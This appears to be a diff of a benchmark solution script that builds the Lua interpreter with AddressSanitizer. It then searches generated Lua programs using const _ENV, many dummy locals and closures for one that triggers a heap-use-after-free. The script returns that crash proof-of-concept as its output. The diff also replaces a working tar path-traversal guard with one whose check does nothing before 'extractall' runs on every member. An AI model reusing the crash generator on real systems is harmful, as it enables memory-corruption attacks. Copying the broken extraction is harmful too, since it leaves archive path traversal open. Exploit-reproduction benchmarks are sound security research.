@@ -4,51 +4,40 @@ import tarfile
 import tempfile
 import subprocess
 import shutil
-import time
-from typing import Optional, List, Tuple
+from typing import List, Optional, Tuple
 
 
-def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
-    base = os.path.abspath(path)
-    for member in tar.getmembers():
-        member_path = os.path.abspath(os.path.join(path, member.name))
-        if not (member_path == base or member_path.startswith(base + os.sep)):
-            continue
-        tar.extract(member, path=path)
+LUA_KEYWORDS = {
+    "and", "break", "do", "else", "elseif", "end", "false", "for", "function",
+    "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return",
+    "then", "true", "until", "while",
+}
 
 
-def _find_lua_project_root(base: str) -> Optional[str]:
-    # Prefer standard Lua layout: <root>/src/lua.c, <root>/Makefile
-    candidates = []
-    for root, dirs, files in os.walk(base):
-        if 'lua.c' in files and os.path.basename(root) == 'src':
-            proj_root = os.path.dirname(root)
-            candidates.append(proj_root)
-    if candidates:
-        # pick shortest path (closest to base)
-        candidates.sort(key=lambda p: len(os.path.relpath(p, base).split(os.sep)))
-        return candidates[0]
-
-    # Fallback: look for Makefile that has "luac" target and lua.c nearby
-    for root, dirs, files in os.walk(base):
-        if 'Makefile' in files:
-            mk = os.path.join(root, 'Makefile')
-            try:
-                with open(mk, 'r', errors='ignore') as f:
-                    txt = f.read(200000)
-                if 'luac' in txt and 'lua' in txt:
-                    return root
-            except OSError:
-                pass
-    return None
+def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
+    with tarfile.open(tar_path, "r:*") as tf:
+        base = os.path.realpath(dst_dir)
+        for m in tf.getmembers():
+            name = m.name
+            if not name or name == ".":
+                continue
+            out_path = os.path.realpath(os.path.join(dst_dir, name))
+            if not (out_path == base or out_path.startswith(base + os.sep)):
+                continue
+        tf.extractall(dst_dir)
 
 
-def _which_cc() -> str:
-    for cc in ('clang', 'gcc'):
-        p = shutil.which(cc)
-        if p:
-            return cc
-    return 'cc'
+def _find_project_root(extract_dir: str) -> str:
+    entries = [e for e in os.listdir(extract_dir) if e not in (".", "..", "__MACOSX")]
+    if len(entries) == 1:
+        p = os.path.join(extract_dir, entries[0])
+        if os.path.isdir(p):
+            return p
+    return extract_dir
+
+
+def _which(cmd: str) -> Optional[str]:
+    return shutil.which(cmd)
 
 
 def _run(cmd: List[str], cwd: Optional[str] = None, env: Optional[dict] = None, timeout: int = 120) -> subprocess.CompletedProcess:
@@ -56,523 +45,228 @@ def _run(cmd: List[str], cwd: Optional[str] = None, env: Optional[dict] = None, 
         cmd,
         cwd=cwd,
         env=env,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
         timeout=timeout,
-        text=True,
-        errors='replace'
+        check=False,
     )
 
 
-def _build_lua(proj_root: str, deadline: float) -> Tuple[Optional[str], Optional[str]]:
-    cc = _which_cc()
-    cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined"
-    ldflags = "-fsanitize=address,undefined"
+def _find_executable_named(root: str, names: Tuple[str, ...]) -> Optional[str]:
+    candidates = []
+    for dirpath, dirnames, filenames in os.walk(root):
+        for fn in filenames:
+            if fn in names:
+                p = os.path.join(dirpath, fn)
+                try:
+                    st = os.stat(p)
+                except OSError:
+                    continue
+                if not (st.st_mode & 0o111):
+                    continue
+                candidates.append(p)
+    if not candidates:
+        return None
+    candidates.sort(key=lambda x: (len(x), x))
+    return candidates[0]
+
+
+def _has_lua_sources(root: str) -> bool:
+    likely = [
+        os.path.join(root, "src", "lua.c"),
+        os.path.join(root, "src", "lparser.c"),
+        os.path.join(root, "src", "lcode.c"),
+        os.path.join(root, "Makefile"),
+    ]
+    return any(os.path.exists(p) for p in likely)
+
+
+def _build_lua_asan(root: str) -> Optional[str]:
+    if not os.path.exists(os.path.join(root, "Makefile")):
+        return None
+
+    cc = _which("clang") or _which("gcc")
+    if not cc:
+        return None
+    cc_name = os.path.basename(cc)
 
     env = os.environ.copy()
-    env['CC'] = cc
-    env['MYCFLAGS'] = cflags
-    env['MYLDFLAGS'] = ldflags
+    env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "")
+    if env["ASAN_OPTIONS"]:
+        env["ASAN_OPTIONS"] += ":"
+    env["ASAN_OPTIONS"] += "detect_leaks=0:abort_on_error=1"
 
-    # Some builds are sensitive to -Werror; reduce noise.
-    env.setdefault('CFLAGS', '')
-    env.setdefault('LDFLAGS', '')
+    mycflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address"
+    myldflags = "-fsanitize=address"
 
-    build_attempts = []
-    # Standard Lua: build from root with target
-    for target in ('linux', 'posix', 'generic', 'all'):
-        build_attempts.append((proj_root, ['make', '-j8', target]))
+    make_cmds = [
+        ["make", "-j8", "guess", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
+        ["make", "-j8", "linux", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
+        ["make", "-j8", "posix", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
+        ["make", "-j8", "generic", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
+        ["make", "-j8", f"CC={cc_name}", f"MYCFLAGS={mycflags}", f"MYLDFLAGS={myldflags}"],
+    ]
 
-    # Or build from src directory
-    srcdir = os.path.join(proj_root, 'src')
-    if os.path.isdir(srcdir):
-        for target in ('linux', 'posix', 'generic', 'all'):
-            build_attempts.append((srcdir, ['make', '-j8', target]))
-
-    # Try clean lightly (ignore failures)
-    for d in (proj_root, srcdir):
-        if os.path.isdir(d) and os.path.isfile(os.path.join(d, 'Makefile')):
-            try:
-                _run(['make', 'clean'], cwd=d, env=env, timeout=max(10, int(deadline - time.monotonic())))
-            except Exception:
-                pass
-
-    for cwd, cmd in build_attempts:
-        if time.monotonic() > deadline:
-            break
-        if not os.path.isfile(os.path.join(cwd, 'Makefile')):
-            continue
+    for cmd in make_cmds:
         try:
-            tout = max(10, int(deadline - time.monotonic()))
-            cp = _run(cmd, cwd=cwd, env=env, timeout=tout)
-            if cp.returncode == 0:
-                lua_path, luac_path = _find_binaries(proj_root)
-                if lua_path:
-                    return lua_path, luac_path
+            r = _run(cmd, cwd=root, env=env, timeout=180)
         except Exception:
             continue
+        if r.returncode == 0:
+            lua_bin = _find_executable_named(root, ("lua",))
+            if lua_bin:
+                return lua_bin
 
-    lua_path, luac_path = _find_binaries(proj_root)
-    return lua_path, luac_path
+    lua_bin = _find_executable_named(root, ("lua",))
+    return lua_bin
 
 
-def _find_binaries(proj_root: str) -> Tuple[Optional[str], Optional[str]]:
-    def is_exe(p: str) -> bool:
-        return os.path.isfile(p) and os.access(p, os.X_OK)
-
-    # Standard locations
-    for p in (
-        os.path.join(proj_root, 'src', 'lua'),
-        os.path.join(proj_root, 'lua'),
-    ):
-        if is_exe(p):
-            lua_path = p
-            break
-    else:
-        lua_path = None
-
-    for p in (
-        os.path.join(proj_root, 'src', 'luac'),
-        os.path.join(proj_root, 'luac'),
-    ):
-        if is_exe(p):
-            luac_path = p
-            break
-    else:
-        luac_path = None
-
-    # Fallback search
-    if not lua_path or not luac_path:
-        found_lua = None
-        found_luac = None
-        for root, dirs, files in os.walk(proj_root):
-            if not found_lua and 'lua' in files:
-                p = os.path.join(root, 'lua')
-                if is_exe(p):
-                    found_lua = p
-            if not found_luac and 'luac' in files:
-                p = os.path.join(root, 'luac')
-                if is_exe(p):
-                    found_luac = p
-            if (lua_path or found_lua) and (luac_path or found_luac):
+def _lua_ident_gen(n: int, reserved: set) -> List[str]:
+    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    names = []
+    i = 0
+    while len(names) < n:
+        x = i
+        s = ""
+        base = len(alphabet)
+        while True:
+            s = alphabet[x % base] + s
+            x //= base
+            if x == 0:
                 break
-        lua_path = lua_path or found_lua
-        luac_path = luac_path or found_luac
-
-    return lua_path, luac_path
-
-
-def _looks_like_sanitizer_crash(stderr: str, returncode: int) -> bool:
-    if returncode < 0:
-        return True
-    s = stderr
-    if 'AddressSanitizer' in s or 'UndefinedBehaviorSanitizer' in s or 'LeakSanitizer' in s:
-        return True
-    if 'heap-use-after-free' in s or 'use-after-free' in s:
-        return True
-    if 'ERROR:' in s and 'Sanitizer' in s:
-        return True
-    if 'SEGV' in s and ('ERROR' in s or 'Sanitizer' in s):
-        return True
-    return False
+        i += 1
+        if s in LUA_KEYWORDS or s in reserved or s.startswith("_"):
+            continue
+        names.append(s)
+    return names
 
 
-def _looks_like_lua_error(stderr: str) -> bool:
-    st = stderr.strip()
-    if not st:
-        return False
-    if st.startswith('lua:') or st.startswith('luac:'):
-        return True
-    if 'stack traceback:' in st:
-        return True
-    if 'syntax error' in st:
-        return True
-    if 'unexpected symbol' in st:
-        return True
-    if 'near \'' in st and 'error' in st:
-        return True
-    return False
+def _gen_pat0(n_dummy: int) -> bytes:
+    # Minimal: declare _ENV<const>, lots of dummy locals, then access globals.
+    reserved = {"_ENV", "_G", "t", "o", "x", "f", "s"}
+    vars_ = _lua_ident_gen(n_dummy, reserved)
+    dummy = ("local " + ",".join(vars_) + ";") if vars_ else ""
+    code = "local _ENV<const>=_ENV;" + dummy + "local t=tostring;t(0);"
+    return code.encode("utf-8")
 
 
-def _test_candidate(lua_path: str, luac_path: Optional[str], prog: bytes, timeout_s: int = 3) -> Tuple[bool, str]:
-    with tempfile.TemporaryDirectory() as td:
-        fpath = os.path.join(td, 'poc.lua')
-        with open(fpath, 'wb') as f:
-            f.write(prog)
-
-        env = os.environ.copy()
-        env['ASAN_OPTIONS'] = env.get('ASAN_OPTIONS', '') + (':' if env.get('ASAN_OPTIONS') else '') + "detect_leaks=0:abort_on_error=1:allocator_may_return_null=1"
-        env['UBSAN_OPTIONS'] = env.get('UBSAN_OPTIONS', '') + (':' if env.get('UBSAN_OPTIONS') else '') + "halt_on_error=1:abort_on_error=1:print_stacktrace=1"
-
-        if luac_path and os.path.isfile(luac_path) and os.access(luac_path, os.X_OK):
-            try:
-                cp = _run([luac_path, '-p', fpath], cwd=os.path.dirname(luac_path), env=env, timeout=timeout_s)
-                if _looks_like_sanitizer_crash(cp.stderr, cp.returncode):
-                    return True, 'luac'
-                if cp.returncode != 0:
-                    if _looks_like_lua_error(cp.stderr):
-                        return False, 'syntax'
-            except Exception:
-                pass
-
-        try:
-            cp = _run([lua_path, fpath], cwd=os.path.dirname(lua_path), env=env, timeout=timeout_s)
-        except subprocess.TimeoutExpired:
-            return False, 'timeout'
-        except Exception:
-            return False, 'execfail'
-
-        if _looks_like_sanitizer_crash(cp.stderr, cp.returncode):
-            return True, 'lua'
-        if cp.returncode != 0 and _looks_like_lua_error(cp.stderr):
-            return False, 'luaerror'
-        return False, 'noclash'
-
-
-def _ddmin_lines(lines: List[str], test_fn, deadline: float) -> List[str]:
-    if not lines:
-        return lines
-    n = 2
-    best = lines[:]
-
-    def join(ls: List[str]) -> bytes:
-        return ("\n".join(ls).rstrip() + "\n").encode('utf-8', 'surrogatepass')
-
-    base_prog = join(best)
-    ok, _ = test_fn(base_prog)
-    if not ok:
-        return best
-
-    while time.monotonic() < deadline:
-        length = len(best)
-        if length < 2:
-            break
-        if n > length:
-            break
-        chunk_size = (length + n - 1) // n
-        reduced = False
-        for i in range(0, length, chunk_size):
-            if time.monotonic() >= deadline:
-                break
-            trial = best[:i] + best[i + chunk_size:]
-            if not trial:
-                continue
-            prog = join(trial)
-            ok, _ = test_fn(prog)
-            if ok:
-                best = trial
-                n = 2
-                reduced = True
-                break
-        if not reduced:
-            if n >= length:
-                break
-            n = min(length, n * 2)
-    return best
-
-
-def _gen_candidates() -> List[bytes]:
-    cands: List[str] = []
-
-    cands.append(
-        "local G=_G\n"
-        "local _ENV <const> = setmetatable({}, {__index=G})\n"
-        "local function f()\n"
-        "  return math.floor(0)\n"
-        "end\n"
-        "return f()\n"
+def _gen_pat1(n_dummy: int) -> bytes:
+    # Nested closure capturing _ENV and other upvalues; execute.
+    reserved = {"_ENV", "_G", "t", "o", "x", "f", "s"}
+    vars_ = _lua_ident_gen(n_dummy, reserved)
+    dummy = ("local " + ",".join(vars_) + ";") if vars_ else ""
+    code = (
+        "local _ENV<const>=_ENV;"
+        + dummy +
+        "local function o()local x=0;return function()return tostring(x)..tostring(print)end end;"
+        "o()();"
     )
+    return code.encode("utf-8")
 
-    cands.append(
-        "local G=_G\n"
-        "local out\n"
-        "do\n"
-        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-        "  function a()\n"
-        "    return tostring(math.floor(0))\n"
-        "  end\n"
-        "  out = a\n"
-        "  goto L\n"
-        "end\n"
-        "::L::\n"
-        "collectgarbage('collect')\n"
-        "return out()\n"
+
+def _gen_pat2(n_dummy: int) -> bytes:
+    # Add global set/get under const _ENV; execute.
+    reserved = {"_ENV", "_G", "t", "o", "x", "f", "s", "X"}
+    vars_ = _lua_ident_gen(n_dummy, reserved)
+    dummy = ("local " + ",".join(vars_) + ";") if vars_ else ""
+    code = (
+        "local _ENV<const>=_ENV;"
+        + dummy +
+        "X=0;"
+        "local function o()local x=1;return function()X=X+1;return tostring(x)..tostring(X)..tostring(print)end end;"
+        "o()();"
     )
+    return code.encode("utf-8")
 
-    cands.append(
-        "local G=_G\n"
-        "local out\n"
-        "do\n"
-        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-        "  local function wrap()\n"
-        "    function a()\n"
-        "      local s = ''\n"
-        "      s = s .. tostring(math.floor(0))\n"
-        "      return s\n"
-        "    end\n"
-        "    return a\n"
-        "  end\n"
-        "  out = wrap()\n"
-        "  goto L\n"
-        "end\n"
-        "::L::\n"
-        "collectgarbage('collect')\n"
-        "local t={}\n"
-        "for i=1,2000 do t[i]=i end\n"
-        "collectgarbage('collect')\n"
-        "return out()\n"
+
+def _gen_pat_load(n_dummy: int) -> bytes:
+    # Compile a nested chunk that declares _ENV<const>; run it a few times with GC.
+    reserved = {"_ENV", "_G", "t", "o", "x", "f", "s", "L"}
+    vars_ = _lua_ident_gen(n_dummy, reserved)
+    dummy = ("local " + ",".join(vars_)) if vars_ else ""
+    inner = "local _ENV<const>=_ENV;" + (dummy + ";") + "local t=tostring;t(0);"
+    inner = inner.replace("]", "\\]")
+    code = (
+        "local L=[[" + inner + "]];"
+        "for i=1,5 do local f=assert(load(L));f();collectgarbage() end;"
     )
+    return code.encode("utf-8")
 
-    cands.append(
-        "local G=_G\n"
-        "local out\n"
-        "do\n"
-        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-        "  local function mk()\n"
-        "    local u = 1\n"
-        "    function a(x)\n"
-        "      if x then\n"
-        "        goto L1\n"
-        "      end\n"
-        "      ::L1::\n"
-        "      return (u + 1) + math.floor(0)\n"
-        "    end\n"
-        "    return a\n"
-        "  end\n"
-        "  out = mk()\n"
-        "  goto L0\n"
-        "end\n"
-        "::L0::\n"
-        "collectgarbage('collect')\n"
-        "return out(true)\n"
-    )
 
-    # Register pressure / upvalue capture variants
-    for n in (5, 10, 20, 40, 80, 120):
-        locals_decl = ",".join(f"a{i}" for i in range(1, n + 1))
-        locals_vals = ",".join(str(i) for i in range(1, n + 1))
-        sum_expr = " + ".join(f"a{i}" for i in range(1, n + 1))
-        cands.append(
-            "local G=_G\n"
-            "local out\n"
-            "do\n"
-            "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-            f"  local {locals_decl} = {locals_vals}\n"
-            "  local function mk()\n"
-            "    function a(x)\n"
-            f"      local z = ({sum_expr}) + math.floor(0)\n"
-            "      if x then goto L1 end\n"
-            "      ::L1::\n"
-            "      return z\n"
-            "    end\n"
-            "    return a\n"
-            "  end\n"
-            "  out = mk()\n"
-            "  goto L0\n"
-            "end\n"
-            "::L0::\n"
-            "collectgarbage('collect')\n"
-            "local t={}\n"
-            "for i=1,3000 do t[i]=i end\n"
-            "collectgarbage('collect')\n"
-            "return out(true)\n"
+def _run_lua_and_check_crash(lua_bin: str, script: bytes, work_dir: str) -> bool:
+    p = os.path.join(work_dir, "poc.lua")
+    with open(p, "wb") as f:
+        f.write(script)
+    env = os.environ.copy()
+    env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "")
+    if env["ASAN_OPTIONS"]:
+        env["ASAN_OPTIONS"] += ":"
+    env["ASAN_OPTIONS"] += "detect_leaks=0:abort_on_error=1"
+    try:
+        r = subprocess.run(
+            [lua_bin, p],
+            cwd=work_dir,
+            env=env,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            timeout=3,
+            check=False,
         )
-
-    # Multiple nested _ENV<const> blocks
-    cands.append(
-        "local G=_G\n"
-        "local out\n"
-        "do\n"
-        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-        "  do\n"
-        "    local _ENV <const> = setmetatable({}, {__index=G})\n"
-        "    function a()\n"
-        "      return tostring(math.floor(0))\n"
-        "    end\n"
-        "    out = a\n"
-        "  end\n"
-        "  goto L\n"
-        "end\n"
-        "::L::\n"
-        "collectgarbage('collect')\n"
-        "return out()\n"
-    )
-
-    return [s.encode('utf-8', 'surrogatepass') for s in cands]
+    except Exception:
+        return False
+    if r.returncode == 0:
+        return False
+    err = r.stderr or b""
+    if b"AddressSanitizer" in err or b"heap-use-after-free" in err or b"use-after-free" in err:
+        return True
+    return False
 
 
-def _fallback_poc() -> bytes:
-    s = (
-        "local G=_G\n"
-        "local out1, out2, out3\n"
-        "do\n"
-        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-        "  function a1()\n"
-        "    local x = 0\n"
-        "    for i=1,10 do x = x + i end\n"
-        "    return tostring(x + math.floor(0))\n"
-        "  end\n"
-        "  out1 = a1\n"
-        "  goto L1\n"
-        "end\n"
-        "::L1::\n"
-        "do\n"
-        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-        "  local function wrap()\n"
-        "    function a2(y)\n"
-        "      if y then goto L2 end\n"
-        "      ::L2::\n"
-        "      local t={}\n"
-        "      for i=1,50 do t[i]=i end\n"
-        "      return #t + math.floor(0)\n"
-        "    end\n"
-        "    return a2\n"
-        "  end\n"
-        "  out2 = wrap()\n"
-        "  goto L3\n"
-        "end\n"
-        "::L3::\n"
-        "do\n"
-        "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-        "  local a,b,c,d,e,f,g,h,i,j = 1,2,3,4,5,6,7,8,9,10\n"
-        "  function a3()\n"
-        "    local z = (a+b+c+d+e+f+g+h+i+j) + math.floor(0)\n"
-        "    return z\n"
-        "  end\n"
-        "  out3 = a3\n"
-        "end\n"
-        "collectgarbage('collect')\n"
-        "local t={}\n"
-        "for k=1,5000 do t[k]=k end\n"
-        "collectgarbage('collect')\n"
-        "local r1 = out1()\n"
-        "local r2 = out2(true)\n"
-        "local r3 = out3()\n"
-        "if r1 == nil or r2 == nil or r3 == nil then return 0 end\n"
-        "return 0\n"
-    )
-    return s.encode('utf-8', 'surrogatepass')
+def _find_min_n_for_pattern(lua_bin: str, gen_func, work_dir: str, max_n: int) -> Optional[Tuple[int, bytes]]:
+    checkpoints = [0, 1, 2, 4, 8, 16, 24, 32, 40, 48, 56, 64, 80, 96, 112, 128, 144, 160, 176, 188, max_n]
+    checkpoints = sorted(set([c for c in checkpoints if 0 <= c <= max_n]))
+    prev = 0
+    for c in checkpoints:
+        script = gen_func(c)
+        if _run_lua_and_check_crash(lua_bin, script, work_dir):
+            for n in range(prev, c + 1):
+                script2 = gen_func(n)
+                if _run_lua_and_check_crash(lua_bin, script2, work_dir):
+                    return n, script2
+            return c, script
+        prev = c + 1
+    return None
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        start = time.monotonic()
-        deadline = start + 110.0
+        fallback = _gen_pat_load(160)
 
         with tempfile.TemporaryDirectory() as td:
             try:
-                with tarfile.open(src_path, 'r:*') as tar:
-                    _safe_extract_tar(tar, td)
+                _safe_extract_tar(src_path, td)
             except Exception:
-                return _fallback_poc()
+                return fallback
 
-            proj_root = _find_lua_project_root(td)
-            if not proj_root:
-                return _fallback_poc()
+            root = _find_project_root(td)
+            if not _has_lua_sources(root):
+                return fallback
 
-            lua_path, luac_path = _build_lua(proj_root, deadline=deadline)
-            if not lua_path:
-                return _fallback_poc()
+            lua_bin = _build_lua_asan(root)
+            if not lua_bin:
+                return fallback
 
-            candidates = _gen_candidates()
+            with tempfile.TemporaryDirectory() as wd:
+                patterns = [
+                    _gen_pat1,
+                    _gen_pat2,
+                    _gen_pat0,
+                    _gen_pat_load,
+                ]
+                max_n = 190
+                for gen in patterns:
+                    res = _find_min_n_for_pattern(lua_bin, gen, wd, max_n)
+                    if res is not None:
+                        return res[1]
 
-            def test_fn(prog: bytes) -> Tuple[bool, str]:
-                return _test_candidate(lua_path, luac_path, prog, timeout_s=3)
-
-            found: Optional[bytes] = None
-            for prog in candidates:
-                if time.monotonic() > deadline:
-                    break
-                ok, _where = test_fn(prog)
-                if ok:
-                    found = prog
-                    break
-
-            if not found and time.monotonic() < deadline:
-                # Randomized small search around register pressure and goto patterns
-                import random
-                rng = random.Random(0x44597)
-                for _ in range(200):
-                    if time.monotonic() > deadline:
-                        break
-                    n = rng.choice([8, 12, 16, 24, 32, 48, 64, 96, 128, 160])
-                    use_nested = rng.choice([False, True])
-                    use_goto = rng.choice([True, True, False])
-
-                    locals_decl = ",".join(f"a{i}" for i in range(1, n + 1))
-                    locals_vals = ",".join(str((i % 17) + 1) for i in range(1, n + 1))
-                    sum_expr = " + ".join(f"a{i}" for i in range(1, n + 1))
-
-                    if use_nested:
-                        body = (
-                            "do\n"
-                            "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-                            "  local function mk()\n"
-                            "    function a(x)\n"
-                            f"      local z = ({sum_expr}) + math.floor(0)\n"
-                            + ("      if x then goto L1 end\n      ::L1::\n" if use_goto else "")
-                            "      return z\n"
-                            "    end\n"
-                            "    return a\n"
-                            "  end\n"
-                            "  out = mk()\n"
-                            + ("  goto L0\n" if use_goto else "")
-                            "end\n"
-                            + ("::L0::\n" if use_goto else "")
-                        )
-                        prog_s = (
-                            "local G=_G\n"
-                            "local out\n"
-                            f"{body}"
-                            "collectgarbage('collect')\n"
-                            "local t={}\n"
-                            "for i=1,3000 do t[i]=i end\n"
-                            "collectgarbage('collect')\n"
-                            "return out(true)\n"
-                        )
-                    else:
-                        prog_s = (
-                            "local G=_G\n"
-                            "local out\n"
-                            "do\n"
-                            "  local _ENV <const> = setmetatable({}, {__index=G})\n"
-                            f"  local {locals_decl} = {locals_vals}\n"
-                            "  function a(x)\n"
-                            f"    local z = ({sum_expr}) + math.floor(0)\n"
-                            + ("    if x then goto L1 end\n    ::L1::\n" if use_goto else "")
-                            "    return z\n"
-                            "  end\n"
-                            "  out = a\n"
-                            + ("  goto L0\n" if use_goto else "")
-                            "end\n"
-                            + ("::L0::\n" if use_goto else "")
-                            "collectgarbage('collect')\n"
-                            "local t={}\n"
-                            "for i=1,3000 do t[i]=i end\n"
-                            "collectgarbage('collect')\n"
-                            "return out(true)\n"
-                        )
-                    prog = prog_s.encode('utf-8', 'surrogatepass')
-                    ok, _where = test_fn(prog)
-                    if ok:
-                        found = prog
-                        break
-
-            if not found:
-                return _fallback_poc()
-
-            # Minimize (line-based) with remaining time
-            remaining = max(0.0, deadline - time.monotonic())
-            min_deadline = time.monotonic() + min(25.0, remaining)
-            try:
-                text = found.decode('utf-8', 'surrogatepass')
-                lines = text.splitlines()
-                minimized_lines = _ddmin_lines(lines, test_fn, min_deadline)
-                minimized = ("\n".join(minimized_lines).rstrip() + "\n").encode('utf-8', 'surrogatepass')
-                ok, _ = test_fn(minimized)
-                if ok:
-                    return minimized
-            except Exception:
-                pass
-
-            return found
+        return fallback
